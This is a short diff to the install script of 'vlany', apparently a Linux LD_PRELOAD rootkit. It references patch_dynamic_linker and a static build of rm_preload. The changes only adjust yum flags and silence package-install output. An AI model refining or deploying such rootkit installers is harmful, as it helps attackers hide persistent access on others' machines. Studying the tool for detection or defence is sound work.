@@ -7,7 +7,7 @@
 
 [ ! -f `which gcc 2>/dev/null || echo "NO"` ] && { echo "Warning: gcc isn't installed on this box. Exiting. Install it."; exit; }
 
-[ -f /usr/bin/yum ] && { echo "Installing glibc-static"; yes | yum -y install glibc-static; }
+[ -f /usr/bin/yum ] && { echo "Installing glibc-static"; yes | yum -y install glibc-static &>/dev/null; }
 
 if [ ! -f /usr/bin/yum ]; then # temporary fix for now just to avoid some miscellaneous errors - this feature isn't incredibly important
     gcc misc/rm_preload.c -static -o misc/rm_preload
@@ -44,7 +44,7 @@ patch_dynamic_linker ()
 install_vlany_prerequisites ()
 {
     if [ -f /usr/bin/yum ]; then
-        yes | yum -y install make gcc pam-devel openssl-devel newt libgcc.i686 glibc-devel.i686 glibc-devel openssl-devel.i686 libpcap libpcap-devel vim-common attr &>/dev/null
+        yum install -y -q -e 0 make gcc pam-devel openssl-devel newt libgcc.i686 glibc-devel.i686 glibc-devel openssl-devel.i686 libpcap libpcap-devel vim-common attr &>/dev/null
     elif [ -f /usr/bin/apt-get ]; then
         dpkg --add-architecture i386 &>/dev/null
         yes | apt-get update &>/dev/null
@@ -56,7 +56,7 @@ install_vlany_prerequisites ()
     fi
     
     if [ -f /usr/bin/yum ]; then
-        yes | yum -y install python2 &>/dev/null
+        yum install -y -q -e 0 python2
     elif [ -f /usr/bin/apt-get ]; then
         yes | apt-get update &>/dev/null && sleep 1
         apt-get --yes --force-yes install python &>/dev/null
@@ -75,7 +75,7 @@ vlany_install_dialog ()
 
     echo "Installing dialog"
     if [ -f /usr/bin/yum ]; then
-        yes | yum install dialog &>/dev/null
+        yum install -y -q -e 0 dialog
     elif [ -f /usr/bin/apt-get ]; then
         yes | apt-get update &>/dev/null
         apt-get --yes --force-yes install dialog &>/dev/null
